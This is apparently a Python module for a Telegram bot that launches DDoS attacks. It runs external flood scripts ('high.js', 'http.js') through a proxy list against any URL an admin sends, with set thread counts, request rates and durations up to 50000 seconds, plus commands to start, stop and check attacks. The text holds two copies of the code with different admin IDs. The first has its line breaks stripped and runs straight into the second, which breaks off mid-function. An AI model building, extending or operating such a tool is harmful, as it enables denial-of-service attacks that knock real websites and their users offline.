import os import subprocess import time import sys # =============== GLOBAL VARIABLES =============== ATTACK_ACTIVE = False ATTACK_PROCESS = None ATTACK_START_TIME = None ATTACK_TARGET = "" ATTACK_METHOD = "" ATTACK_TYPE = "" # "high" hoặc "http" # Admin ID ADMIN_ID = 8257386163 # THÔNG SỐ MỚI THREADS = 10 # threads = 10 REQUESTS = 50 # requests/ratelimit = 50 # =============== UTILITY FUNCTIONS =============== def print_colored(text, color="white"): colors = { "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m", "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m", "white": "\033[97m", "reset": "\033[0m" } print(f"{colors.get(color, colors['white'])}{text}{colors['reset']}") def is_admin(user_id): return user_id == ADMIN_ID def get_elapsed_time(): if ATTACK_START_TIME: elapsed = time.time() - ATTACK_START_TIME hours = int(elapsed // 3600) minutes = int((elapsed % 3600) // 60) seconds = int(elapsed % 60) return f"{hours:02d}:{minutes:02d}:{seconds:02d}" return "00:00:00" def get_commands_dir(): """Lấy đường dẫn đến commands/""" current_file = os.path.abspath(__file__) return os.path.dirname(current_file) def count_proxies(): """Đếm proxy""" try: commands_dir = get_commands_dir() proxy_path = os.path.join(commands_dir, "proxy.txt") if not os.path.exists(proxy_path): return 0 with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f: proxies = [line.strip() for line in f if line.strip()] return len(proxies) except: return 0 def validate_url(url): if not url: return False, "URL không được để trống!" if not url.startswith("http://") and not url.startswith("https://"): return False, "URL phải bắt đầu với http:// hoặc https://" return True, "URL hợp lệ" def run_high_attack(url, method="POST"): """Chạy node high.js với thông số mới""" global ATTACK_ACTIVE, ATTACK_PROCESS, ATTACK_START_TIME, ATTACK_TARGET, ATTACK_METHOD, ATTACK_TYPE print_colored("\n" + "="*70, "cyan") print_colored("[🥀] BẮT ĐẦU CHẠY HIGH.JS ATTACK", "red") print_colored("="*70, "cyan") try: commands_dir = get_commands_dir() # Kiểm tra file highjs_path = os.path.join(commands_dir, "high.js") if not os.path.exists(highjs_path): print_colored(f"[💢] KHÔNG TÌM THẤY high.js!", "red") return False, "Không tìm thấy high.js" # Thêm ?q=%RAND% if "?" in url: target_url = f"{url}&q=%RAND%" else: target_url = f"{url}?q=%RAND%" print_colored(f"[💤] Target URL: {target_url}", "green") print_colored(f"[📡] Method: {method}", "magenta") # SỬA: Sử dụng thông số mới time_param = "5000" # time = 5000 giây threads = str(THREADS) # threads = 10 ratelimit = str(REQUESTS) # ratelimit = 50/giây print_colored(f"[⚙️] Tham số: Time={time_param}s, Threads={threads}, Rate={ratelimit}/s", "cyan") print_colored(f"[💥] Cấu hình mới: Threads={THREADS}, Requests={REQUESTS}/s", "yellow") # Tạo lệnh cmd = [ "node", "high.js", method, target_url, time_param, threads, ratelimit, "proxy.txt", "--query", "1", "--cookie", "uh=good", "--http", "2", "--debug", "--full", "--winter" ] cmd_str = " ".join(cmd) print_colored(f"\n[🔧] FULL COMMAND:", "yellow") print_colored(f" {cmd_str}", "white") print_colored(f"[📁] Working dir: {commands_dir}", "cyan") # CHẠY TRỰC TIẾP - KHÔNG CHECK print_colored("\n[💔] ĐANG CHẠY LỆNH...", "cyan") print_colored("-"*50, "white") ATTACK_START_TIME = time.time() ATTACK_TARGET = url ATTACK_METHOD = method ATTACK_TYPE = "high" # Chạy và capture output ATTACK_PROCESS = subprocess.Popen( cmd, cwd=commands_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, text=True, bufsize=1, universal_newlines=True ) print_colored(f"[✅] Process started with PID: {ATTACK_PROCESS.pid}", "green") # Đọc output real-time print_colored("\n[📡] OUTPUT TỪ HIGH.JS:", "cyan") print_colored("-"*50, "white") # Đọc và hiển thị output import select stdout_fd = ATTACK_PROCESS.stdout.fileno() stderr_fd = ATTACK_PROCESS.stderr.fileno() start_time = time.time() timeout = 5 # Đọc trong 5 giây đầu while time.time() - start_time < timeout: if ATTACK_PROCESS.poll() is not None: break rlist, _, _ = select.select([stdout_fd, stderr_fd], [], [], 0.1) for fd in rlist: if fd == stdout_fd: line = ATTACK_PROCESS.stdout.readline() if line: line = line.rstrip() print_colored(f"[OUT] {line}", "green") elif fd == stderr_fd: line = ATTACK_PROCESS.stderr.readline() if line: line = line.rstrip() print_colored(f"[ERR] {line}", "red") # Kiểm tra process if ATTACK_PROCESS.poll() is not None: return_code = ATTACK_PROCESS.returncode print_colored(f"\n[💦️] Process đã kết thúc với code: {return_code}", "yellow") # Đọc phần còn lại remaining_stdout, remaining_stderr = ATTACK_PROCESS.communicate() if remaining_stdout: print_colored(f"[OUT] {remaining_stdout}", "green") if remaining_stderr: print_colored(f"[ERR] {remaining_stderr}", "red") if return_code != 0: return False, f"💢 High.js exited with code {return_code}" else: print_colored("[✅] High.js completed", "green") return True, None else: print_colored(f"\n[✅] Process {ATTACK_PROCESS.pid} đang chạy", "green") return True, None except Exception as e: print_colored(f"\n[💢] EXCEPTION: {e}", "red") import traceback traceback.print_exc() return False, f"💢 Exception: {str(e)}" def run_http_attack(url): """Chạy node http.js với thông số mới""" global ATTACK_ACTIVE, ATTACK_PROCESS, ATTACK_START_TIME, ATTACK_TARGET, ATTACK_METHOD, ATTACK_TYPE print_colored("\n" + "="*70, "cyan") print_colored("[🥀] BẮT ĐẦU CHẠY HTTP.JS ATTACK", "red") print_colored("="*70, "cyan") try: commands_dir = get_commands_dir() # Kiểm tra file httpjs_path = os.path.join(commands_dir, "http.js") if not os.path.exists(httpjs_path): print_colored(f"[💢] KHÔNG TÌM THẤY http.js!", "red") return False, "Không tìm thấy http.js" print_colored(f"[💤] Target URL: {url}", "green") # SỬA: Sử dụng thông số mới time_param = "50000" # time = 50000 giây threads = str(THREADS) # threads = 10 (thay vì 60) ratelimit = str(REQUESTS) # ratelimit = 50/giây (thay vì 20) print_colored(f"[⚙️] Tham số: Time={time_param}s, Threads={threads}, Rate={ratelimit}/s", "cyan") print_colored(f"[💥] Cấu hình mới: Threads={THREADS}, Requests={REQUESTS}/s", "yellow") # Tạo lệnh cho http.js cmd = [ "node", "http.js", url, # URL không thêm ?q=%RAND% time_param, # 50000 threads, # 10 ratelimit, # 50 "proxy.txt" ] cmd_str = " ".join(cmd) print_colored(f"\n[🔧] FULL COMMAND:", "yellow") print_colored(f" {cmd_str}", "white") print_colored(f"[📁] Working dir: {commands_dir}", "cyan") # CHẠY TRỰC TIẾP print_colored("\n[💔] ĐANG CHẠY LỆNH...", "cyan") print_colored("-"*50, "white") ATTACK_START_TIME = time.time() ATTACK_TARGET = url ATTACK_METHOD = "HTTP" ATTACK_TYPE = "http" # Chạy và capture output ATTACK_PROCESS = subprocess.Popen( cmd, cwd=commands_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, text=True, bufsize=1, universal_newlines=True ) print_colored(f"[✅] Process started with PID: {ATTACK_PROCESS.pid}", "green") # Đọc output real-time print_colored("\n[📡] OUTPUT TỪ HTTP.JS:", "cyan") print_colored("-"*50, "white") # Đọc và hiển thị output import select stdout_fd = ATTACK_PROCESS.stdout.fileno() stderr_fd = ATTACK_PROCESS.stderr.fileno() start_time = time.time() timeout = 5 while time.time() - start_time < timeout: if ATTACK_PROCESS.poll() is not None: break rlist, _, _ = select.select([stdout_fd, stderr_fd], [], [], 0.1) for fd in rlist: if fd == stdout_fd: line = ATTACK_PROCESS.stdout.readline() if line: line = line.rstrip() print_colored(f"[OUT] {line}", "green") elif fd == stderr_fd: line = ATTACK_PROCESS.stderr.readline() if line: line = line.rstrip() print_colored(f"[ERR] {line}", "red") # Kiểm tra process if ATTACK_PROCESS.poll() is not None: return_code = ATTACK_PROCESS.returncode print_colored(f"\n[💦️] Process đã kết thúc với code: {return_code}", "yellow") remaining_stdout, remaining_stderr = ATTACK_PROCESS.communicate() if remaining_stdout: print_colored(f"[OUT] {remaining_stdout}", "green") if remaining_stderr: print_colored(f"[ERR] {remaining_stderr}", "red") if return_code != 0: return False, f"💢 HTTP.js exited with code {return_code}" else: print_colored("[✅] HTTP.js completed", "green") return True, None else: print_colored(f"\n[✅] Process {ATTACK_PROCESS.pid} đang chạy", "green") return True, None except Exception as e: print_colored(f"\n[💢] EXCEPTION: {e}", "red") import traceback traceback.print_exc() return False, f"💢 Exception: {str(e)}" def stop_attack(): """Dừng attack""" global ATTACK_ACTIVE, ATTACK_PROCESS, ATTACK_START_TIME if not ATTACK_ACTIVE: return False, "🛑 Không có attack nào đang chạy!" ATTACK_ACTIVE = False print_colored("\n[🛑] ĐANG DỪNG ATTACK...", "yellow") if ATTACK_PROCESS: try: print_colored(f"[🔪] Killing process {ATTACK_PROCESS.pid}...", "yellow") ATTACK_PROCESS.terminate() try: ATTACK_PROCESS.wait(timeout=2) print_colored(f"[✅] Process terminated", "green") except: print_colored(f"[💦️] Force killing...", "yellow") ATTACK_PROCESS.kill() ATTACK_PROCESS.wait() print_colored(f"[✅] Process force killed", "green") except Exception as e: print_colored(f"[💦️] Error killing process: {e}", "yellow") # Kill bằng system command kill_cmd = "pkill -f 'node.*js' 2>/dev/null || true" subprocess.run(kill_cmd, shell=True) print_colored(f"[🔪] Ran system kill command", "yellow") elapsed = get_elapsed_time() print_colored(f"[⏱️] Attack duration: {elapsed}", "cyan") print_colored("[✅] Attack stopped", "green") ATTACK_START_TIME = None ATTACK_PROCESS = None return True, None # =============== TELEGRAM COMMAND HANDLERS =============== try: # Import bot từ main.py import sys import os current_dir = os.path.dirname(os.path.abspath(__file__)) parent_dir = os.path.dirname(current_dir) if parent_dir not in sys.path: sys.path.append(parent_dir) from main import bot @bot.message_handler(commands=['ddosstart', 'high', 'http']) def handle_ddosstart(message): if not is_admin(message.chat.id): bot.reply_to(message, "⛔ ACCESS DENIED") return command = message.text.split()[0] # Lấy lệnh: /ddosstart, /high, /http parts = message.text.split(' ', 1) # Nếu chỉ có lệnh không có URL -> hiển thị hướng dẫn if len(parts) < 2: if command == "/ddosstart": help_text = f""" 🥀 *DDOS ATTACK - HƯỚNG DẪN* *CẤU HÌNH HIỆN TẠI:* • Threads: {THREADS} • Requests: {REQUESTS}/giây *CÁC LỆNH:* • /high <url> - High.js attack (POST) • /highget <url> - High.js attack (GET) • /http <url> - HTTP.js attack • /stopattack - Dừng attack • /status - Kiểm tra trạng thái *HIGH.JS THAM SỐ:* • Time: 5000 giây • Threads: {THREADS} • Rate: {REQUESTS}/giây • Thêm: ?q=%RAND% tự động *HTTP.JS THAM SỐ:* • Time: 50000 giây • Threads: {THREADS} • Rate: {REQUESTS}/giây *VÍ DỤ:* /high https://example.com /highget https://target.com /http https://example.com """ elif command == "/high": help_text = f"🔧 *HIGH.JS ATTACK*\n\nCách dùng: /high <url>\nThreads: {THREADS}\nRate: {REQUESTS}/s\nVD: /high https://example.com" elif command == "/http": help_text = f"🌐 *HTTP.JS ATTACK*\n\nCách dùng: /http <url>\nThreads: {THREADS}\nRate: {REQUESTS}/s\nVD: /http https://example.com" else: help_text = "❓ Lệnh không hợp lệ" bot.reply_to(message, help_text, parse_mode='Markdown') return url = parts[1].strip() is_valid, error_msg = validate_url(url) if not is_valid: bot.reply_to(message, f"💢 {error_msg}") return global ATTACK_ACTIVE if ATTACK_ACTIVE: elapsed = get_elapsed_time() bot.reply_to(message, f"💦️ *Đang có attack chạy!*\n\n💤 Target: {ATTACK_TARGET}\n⏱️ Time: {elapsed}\n📡 Type: {ATTACK_TYPE}\n\nDùng /stopattack để dừng trước.", parse_mode='Markdown') return proxy_count = count_proxies() if command == "/high": # HIGH.JS POST msg = bot.reply_to(message, f""" 🔧 *ĐANG CHUẨN BỊ HIGH.JS (POST)...* 💤 *Target:* {url} 📡 *Method:* POST ⏱️ *Time:* 5000s 💫 *Threads:* {THREADS} 💔 *Rate:* {REQUESTS}/giây 💌 *Proxies:* {proxy_count} 💔 *Đang khởi động...* """, parse_mode='Markdown') ATTACK_ACTIVE = True success, error = run_high_attack(url, "POST") if success: elapsed = get_elapsed_time() bot.edit_message_text(f""" ✅ *HIGH.JS ATTACK ĐÃ KHỞI ĐỘNG!* 💤 *Target:* {url} 📡 *Method:* POST ⏱️ *Time:* {elapsed} 💫 *Threads:* {THREADS} 💔 *Rate:* {REQUESTS}/giây 💔 *Đang chạy - xem output trong console* 🛑 Dùng /stopattack để dừng """, message.chat.id, msg.message_id, parse_mode='Markdown') else: ATTACK_ACTIVE = False bot.edit_message_text(f"💢 *Khởi động thất bại!*\n\n{error}", message.chat.id, msg.message_id, parse_mode='Markdown') elif command == "/http": # HTTP.JS msg = bot.reply_to(message, f""" 🌐 *ĐANG CHUẨN BỊ HTTP.JS ATTACK...* 💤 *Target:* {url} ⏱️ *Time:* 50000s 💫 *Threads:* {THREADS} 💔 *Rate:* {REQUESTS}/giây 💌 *Proxies:* {proxy_count} 💔 *Đang khởi động...* """, parse_mode='Markdown') ATTACK_ACTIVE = True success, error = run_http_attack(url) if success: elapsed = get_elapsed_time() bot.edit_message_text(f""" ✅ *HTTP.JS ATTACK ĐÃ KHỞI ĐỘNG!* 💤 *Target:* {url} ⏱️ *Time:* {elapsed} 💫 *Threads:* {THREADS} 💔 *Rate:* {REQUESTS}/giây 💔 *Đang chạy - xem output trong console* 🛑 Dùng /stopattack để dừng """, message.chat.id, msg.message_id, parse_mode='Markdown') else: ATTACK_ACTIVE = False bot.edit_message_text(f"💢 *Khởi động thất bại!*\n\n{error}", message.chat.id, msg.message_id, parse_mode='Markdown') @bot.message_handler(commands=['highget']) def handle_highget(message): if not is_admin(message.chat.id): bot.reply_to(message, "⛔ ACCESS DENIED") return parts = message.text.split(' ', 1) if len(parts) < 2: bot.reply_to(message, f"💢 *Thiếu URL!*\nVD: /highget https://example.com\n\nThreads: {THREADS}\nRate: {REQUESTS}/s", parse_mode='Markdown') return url = parts[1].strip() is_valid, error_msg = validate_url(url) if not is_valid: bot.reply_to(message, f"💢 {error_msg}") return global ATTACK_ACTIVE if ATTACK_ACTIVE: elapsed = get_elapsed_time() bot.reply_to(message, f"💦️ *Đang có attack chạy!*\n\n💤 Target: {ATTACK_TARGET}\n⏱️ Time: {elapsed}\n📡 Type: {ATTACK_TYPE}\n\nDùng /stopattack để dừng trước.", parse_mode='Markdown') return proxy_count = count_proxies() msg = bot.reply_to(message, f""" 🔧 *ĐANG CHUẨN BỊ HIGH.JS (GET)...* 💤 *Target:* {url} 📡 *Method:* GET ⏱️ *Time:* 5000s 💫 *Threads:* {THREADS} 💔 *Rate:* {REQUESTS}/giây 💌 *Proxies:* {proxy_count} 💔 *Đang khởi động...* """, parse_mode='Markdown') ATTACK_ACTIVE = True success, error = run_high_attack(url, "GET") if success: elapsed = get_elapsed_time() bot.edit_message_text(f""" ✅ *HIGH.JS ATTACK (GET) ĐÃ KHỞI ĐỘNG!* 💤 *Target:* {url} 📡 *Method:* GET ⏱️ *Time:* {elapsed} 💫 *Threads:* {THREADS} 💔 *Rate:* {REQUESTS}/giây 💔 *Đang chạy - xem output trong console* 🛑 Dùng /stopattack để dừng """, message.chat.id, msg.message_id, parse_mode='Markdown') else: ATTACK_ACTIVE = False bot.edit_message_text(f"💢 *Khởi động thất bại!*\n\n{error}", message.chat.id, msg.message_id, parse_mode='Markdown') @bot.message_handler(commands=['stopattack']) def handle_stopattack(message): if not is_admin(message.chat.id): bot.reply_to(message, "⛔ ACCESS DENIED") return global ATTACK_ACTIVE if not ATTACK_ACTIVE: bot.reply_to(message, "ℹ️ *Không có attack nào đang chạy*", parse_mode='Markdown') return msg = bot.reply_to(message, "🛑 *Đang dừng attack...*", parse_mode='Markdown') success, error = stop_attack() if success: elapsed = get_elapsed_time() bot.edit_message_text(f""" ✅ *ATTACK ĐÃ DỪNG!* ⏱️ *Thời gian:* {elapsed} 💤 *Target:* {ATTACK_TARGET} 📡 *Type:* {ATTACK_TYPE} 🔧 *Method:* {ATTACK_METHOD} 🔄 *Sẵn sàng cho attack mới* """, message.chat.id, msg.message_id, parse_mode='Markdown') else: bot.edit_message_text(f"💢 *Lỗi khi dừng:*\n{error}", message.chat.id, msg.message_id, parse_mode='Markdown') @bot.message_handler(commands=['status']) def handle_status(message): if not is_admin(message.chat.id): bot.reply_to(message, "⛔ ACCESS DENIED") return global ATTACK_ACTIVE, ATTACK_TARGET, ATTACK_METHOD, ATTACK_TYPE proxy_count = count_proxies() # Kiểm tra process actual_running = False if ATTACK_PROCESS: check_cmd = f"ps -p {ATTACK_PROCESS.pid} > /dev/null 2>&1 && echo 'running'" result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True) actual_running = result.stdout.strip() == "running" if ATTACK_ACTIVE and actual_running: elapsed = get_elapsed_time() if ATTACK_TYPE == "high": threads = str(THREADS) rate = f"{REQUESTS}/giây" time_param = "5000s" else: # http threads = str(THREADS) rate = f"{REQUESTS}/giây" time_param = "50000s" status_text = f""" 💥 *TRẠNG THÁI {ATTACK_TYPE.upper()}.JS ATTACK* 💙 *Status:* ĐANG CHẠY ✅ 💤 *Target:* {ATTACK_TARGET} 📡 *Method:* {ATTACK_METHOD} ⏱️ *Time:* {elapsed} / {time_param} 💫 *Threads:* {threads} 💔 *Rate:* {rate} 💌 *Proxies:* {proxy_count} 🛑 Dùng /stopattack để dừng """ elif ATTACK_ACTIVE and not actual_running: ATTACK_ACTIVE = False status_text = f""" 💥 *TRẠNG THÁI ATTACK* 💙 *Status:* PROCESS ĐÃ CHẾT 💢 💦️ Attack đã tự động dừng 🥀 Dùng /high <url> hoặc /http <url> để bắt đầu mới """ else: status_text = f""" 💥 *TRẠNG THÁI ATTACK* 💙 *Status:* ĐANG TẮT ✅ 💌 *Proxies:* {proxy_count} 💫 *Threads:* {THREADS} 💔 *Rate:* {REQUESTS}/giây 🥀 *Bắt đầu:* • /high <url> - High.js attack • /http <url> - HTTP.js attack """ bot.reply_to(message, status_text, parse_mode='Markdown') print("\n" + "="*70) print("[✅] ddosstart.py LOADED SUCCESSFULLY") print(f"[⚙️] CẤU HÌNH: Threads={THREADS}, Requests={REQUESTS}/s") print("[🔧] LỆNH MỚI:") print(" • /high <url> - High.js POST attack") print(" • /highget <url> - High.js GET attack") print(" • /http <url> - HTTP.js attack") print("[💔] CHẠY TRỰC TIẾP - KHÔNG CHECK") print("="*70) except ImportError as e: print(f"\n[💢] IMPORT ERROR: {e}") import traceback traceback.print_exc() except Exception as e: print(f"\n[💢] LOAD ERROR: {e}") import traceback traceback.print_exc()aimport os
import subprocess
import time
import sys

# =============== GLOBAL VARIABLES ===============
ATTACK_ACTIVE = False
ATTACK_PROCESS = None
ATTACK_START_TIME = None
ATTACK_TARGET = ""
ATTACK_METHOD = ""
ATTACK_TYPE = ""  # "high" hoặc "http"

# Admin ID
ADMIN_ID = 7193062365

# THÔNG SỐ MỚI
THREADS = 10      # threads = 10
REQUESTS = 50     # requests/ratelimit = 50

# =============== UTILITY FUNCTIONS ===============
def print_colored(text, color="white"):
    colors = {
        "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
        "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
        "white": "\033[97m", "reset": "\033[0m"
    }
    print(f"{colors.get(color, colors['white'])}{text}{colors['reset']}")

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_elapsed_time():
    if ATTACK_START_TIME:
        elapsed = time.time() - ATTACK_START_TIME
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    return "00:00:00"

def get_commands_dir():
    """Lấy đường dẫn đến commands/"""
    current_file = os.path.abspath(__file__)
    return os.path.dirname(current_file)

def count_proxies():
    """Đếm proxy"""
    try:
        commands_dir = get_commands_dir()
        proxy_path = os.path.join(commands_dir, "proxy.txt")
        
        if not os.path.exists(proxy_path):
            return 0
        
        with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip()]
        
        return len(proxies)
    except:
        return 0

def validate_url(url):
    if not url:
        return False, "URL không được để trống!"
    
    if not url.startswith("http://") and not url.startswith("https://"):
        return False, "URL phải bắt đầu với http:// hoặc https://"
    
    return True, "URL hợp lệ"

def run_high_attack(url, method="POST"):
    """Chạy node high.js với thông số mới"""
    global ATTACK_ACTIVE, ATTACK_PROCESS, ATTACK_START_TIME, ATTACK_TARGET, ATTACK_METHOD, ATTACK_TYPE
    
    print_colored("\n" + "="*70, "cyan")
    print_colored("[🥀] BẮT ĐẦU CHẠY HIGH.JS ATTACK", "red")
    print_colored("="*70, "cyan")
    
    try:
        commands_dir = get_commands_dir()
        
        # Kiểm tra file
        highjs_path = os.path.join(commands_dir, "high.js")
        
        if not os.path.exists(highjs_path):
            print_colored(f"[💢] KHÔNG TÌM THẤY high.js!", "red")
            return False, "Không tìm thấy high.js"
        
        # Thêm ?q=%RAND%
        if "?" in url:
            target_url = f"{url}&q=%RAND%"
        else:
            target_url = f"{url}?q=%RAND%"
        
        print_colored(f"[💤] Target URL: {target_url}", "green")
        print_colored(f"[📡] Method: {method}", "magenta")
        
        # SỬA: Sử dụng thông số mới
        time_param = "5000"      # time = 5000 giây
        threads = str(THREADS)   # threads = 10
        ratelimit = str(REQUESTS) # ratelimit = 50/giây
        
        print_colored(f"[⚙️] Tham số: Time={time_param}s, Threads={threads}, Rate={ratelimit}/s", "cyan")
        print_colored(f"[💥] Cấu hình mới: Threads={THREADS}, Requests={REQUESTS}/s", "yellow")
        
        # Tạo lệnh
        cmd = [
            "node",
            "high.js",
            method,
            target_url,
            time_param,
            threads,
            ratelimit,
            "proxy.txt",
            "--query", "1",
            "--cookie", "uh=good",
            "--http", "2",
            "--debug",
            "--full",
            "--winter"
        ]
        
        cmd_str = " ".join(cmd)
        print_colored(f"\n[🔧] FULL COMMAND:", "yellow")
        print_colored(f"   {cmd_str}", "white")
        print_colored(f"[📁] Working dir: {commands_dir}", "cyan")
        
        # CHẠY TRỰC TIẾP - KHÔNG CHECK
        print_colored("\n[💔] ĐANG CHẠY LỆNH...", "cyan")
        print_colored("-"*50, "white")
        
        ATTACK_START_TIME = time.time()
        ATTACK_TARGET = url
        ATTACK_METHOD = method
        ATTACK_TYPE = "high"
        
        # Chạy và capture output
        ATTACK_PROCESS = subprocess.Popen(
            cmd,
            cwd=commands_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        print_colored(f"[✅] Process started with PID: {ATTACK_PROCESS.pid}", "green")
        
        # Đọc output real-time
        print_colored("\n[📡] OUTPUT TỪ HIGH.JS:", "cyan")
        print_colored("-"*50, "white")
        
        # Đọc và hiển thị output
        import select
        
        stdout_fd = ATTACK_PROCESS.stdout.fileno()
        stderr_fd = ATTACK_PROCESS.stderr.fileno()
        
        start_time = time.time()
        timeout = 5  # Đọc trong 5 giây đầu
        
        while time.time() - start_time < timeout:
            if ATTACK_PROCESS.poll() is not None:
                break
            
            rlist, _, _ = select.select([stdout_fd, stderr_fd], [], [], 0.1)
            
            for fd in rlist:
                if fd == stdout_fd:
                    line = ATTACK_PROCESS.stdout.readline()
                    if line:
                        line = line.rstrip()
                        print_colored(f"[OUT] {line}", "green")
                elif fd == stderr_fd:
                    line = ATTACK_PROCESS.stderr.readline()
                    if line:
                        line = line.rstrip()
                        print_colored(f"[ERR] {line}", "red")
        
        # Kiểm tra process
        if ATTACK_PROCESS.poll() is not None:
            return_code = ATTACK_PROCESS.returncode
            print_colored(f"\n[💦️] Process đã kết thúc với code: {return_code}", "yellow")
            
            # Đọc phần còn lại
            remaining_stdout, remaining_stderr = ATTACK_PROCESS.communicate()
            if remaining_stdout:
                print_colored(f"[OUT] {remaining_stdout}", "green")
            if remaining_stderr:
                print_colored(f"[ERR] {remaining_stderr}", "red")
            
            if return_code != 0:
                return False, f"💢 High.js exited with code {return_code}"
            else:
                print_colored("[✅] High.js completed", "green")
                return True, None
        else:
            print_colored(f"\n[✅] Process {ATTACK_PROCESS.pid} đang chạy", "green")
            return True, None
        
    except Exception as e:
        print_colored(f"\n[💢] EXCEPTION: {e}", "red")
        import traceback
        traceback.print_exc()
        return False, f"💢 Exception: {str(e)}"

def run_http_attack(url):
    """Chạy node http.js với thông số mới"""
    global ATTACK_ACTIVE, ATTACK_PROCESS, ATTACK_START_TIME, ATTACK_TARGET, ATTACK_METHOD, ATTACK_TYPE
    
    print_colored("\n" + "="*70, "cyan")
    print_colored("[🥀] BẮT ĐẦU CHẠY HTTP.JS ATTACK", "red")
    print_colored("="*70, "cyan")
    
    try:
        commands_dir = get_commands_dir()
        
        # Kiểm tra file
        httpjs_path = os.path.join(commands_dir, "http.js")
        
        if not os.path.exists(httpjs_path):
            print_colored(f"[💢] KHÔNG TÌM THẤY http.js!", "red")
            return False, "Không tìm thấy http.js"
        
        print_colored(f"[💤] Target URL: {url}", "green")
        
        # SỬA: Sử dụng thông số mới
        time_param = "50000"     # time = 50000 giây
        threads = str(THREADS)   # threads = 10 (thay vì 60)
        ratelimit = str(REQUESTS) # ratelimit = 50/giây (thay vì 20)
        
        print_colored(f"[⚙️] Tham số: Time={time_param}s, Threads={threads}, Rate={ratelimit}/s", "cyan")
        print_colored(f"[💥] Cấu hình mới: Threads={THREADS}, Requests={REQUESTS}/s", "yellow")
        
        # Tạo lệnh cho http.js
        cmd = [
            "node",
            "http.js",
            url,           # URL không thêm ?q=%RAND%
            time_param,    # 50000
            threads,       # 10
            ratelimit,     # 50
            "proxy.txt"
        ]
        
        cmd_str = " ".join(cmd)
        print_colored(f"\n[🔧] FULL COMMAND:", "yellow")
        print_colored(f"   {cmd_str}", "white")
        print_colored(f"[📁] Working dir: {commands_dir}", "cyan")
        
        # CHẠY TRỰC TIẾP
        print_colored("\n[💔] ĐANG CHẠY LỆNH...", "cyan")
        print_colored("-"*50, "white")
        
        ATTACK_START_TIME = time.time()
        ATTACK_TARGET = url
        ATTACK_METHOD = "HTTP"
        ATTACK_TYPE = "http"
        
        # Chạy và capture output
        ATTACK_PROCESS = subprocess.Popen(
            cmd,
            cwd=commands_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        print_colored(f"[✅] Process started with PID: {ATTACK_PROCESS.pid}", "green")
        
        # Đọc output real-time
        print_colored("\n[📡] OUTPUT TỪ HTTP.JS:", "cyan")
        print_colored("-"*50, "white")
        
        # Đọc và hiển thị output
        import select
        
        stdout_fd = ATTACK_PROCESS.stdout.fileno()
        stderr_fd = ATTACK_PROCESS.stderr.fileno()
        
        start_time = time.time()
        timeout = 5
        
        while time.time() - start_time < timeout:
            if ATTACK_PROCESS.poll() is not None:
                break
            
            rlist, _, _ = select.select([stdout_fd, stderr_fd], [], [], 0.1)
            
            for fd in rlist:
                if fd == stdout_fd:
                    line = ATTACK_PROCESS.stdout.readline()
                    if line:
                        line = line.rstrip()
                        print_colored(f"[OUT] {line}", "green")
                elif fd == stderr_fd:
                    line = ATTACK_PROCESS.stderr.readline()
                    if line:
                        line = line.rstrip()
                        print_colored(f"[ERR] {line}", "red")
        
        # Kiểm tra process
        if ATTACK_PROCESS.poll() is not None:
            return_code = ATTACK_PROCESS.returncode
            print_colored(f"\n[💦️] Process đã kết thúc với code: {return_code}", "yellow")
            
            remaining_stdout, remaining_stderr = ATTACK_PROCESS.communicate()
            if remaining_stdout:
                print_colored(f"[OUT] {remaining_stdout}", "green")
            if remaining_stderr:
                print_colored(f"[ERR] {remaining_stderr}", "red")
            
            if return_code != 0:
                return False, f"💢 HTTP.js exited with code {return_code}"
            else:
                print_colored("[✅] HTTP.js completed", "green")
                return True, None
        else:
            print_colored(f"\n[✅] Process {ATTACK_PROCESS.pid} đang chạy", "green")
            return True, None
        
    except Exception as e:
        print_colored(f"\n[💢] EXCEPTION: {e}", "red")
        import traceback
        traceback.print_exc()
        return False, f"💢 Exception: {str(e)}"

def stop_attack():
    """Dừng attack"""
    global ATTACK_ACTIVE, ATTACK_PROCESS, ATTACK_START_TIME
    
    if not ATTACK_ACTIVE:
        return False, "🛑 Không có attack nào đang chạy!"
    
    ATTACK_ACTIVE = False
    
    print_colored("\n[🛑] ĐANG DỪNG ATTACK...", "yellow")
    
    if ATTACK_PROCESS:
        try:
            print_colored(f"[🔪] Killing process {ATTACK_PROCESS.pid}...", "yellow")
            ATTACK_PROCESS.terminate()
            
            try:
                ATTACK_PROCESS.wait(timeout=2)
                print_colored(f"[✅] Process terminated", "green")
            except:
                print_colored(f"[💦️] Force killing...", "yellow")
                ATTACK_PROCESS.kill()
                ATTACK_PROCESS.wait()
                print_colored(f"[✅] Process force killed", "green")
            
        except Exception as e:
            print_colored(f"[💦️] Error killing process: {e}", "yellow")
    
    # Kill bằng system command
    kill_cmd = "pkill -f 'node.*js' 2>/dev/null || true"
    subprocess.run(kill_cmd, shell=True)
    print_colored(f"[🔪] Ran system kill command", "yellow")
    
    elapsed = get_elapsed_time()
    print_colored(f"[⏱️] Attack duration: {elapsed}", "cyan")
    print_colored("[✅] Attack stopped", "green")
    
    ATTACK_START_TIME = None
    ATTACK_PROCESS = None
    
    return True, None

# =============== TELEGRAM COMMAND HANDLERS ===============
try:
    # Import bot từ main.py
    import sys
    import os
    current_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(current_dir)
    if parent_dir not in sys.path:
        sys.path.append(parent_dir)
    
    from main import bot
    
    @bot.message_handler(commands=['ddosstart', 'high', 'http'])
    def handle_ddosstart(message):
        if not is_admin(message.chat.id):
            bot.reply_to(message, "⛔ ACCESS DENIED")
            return
        
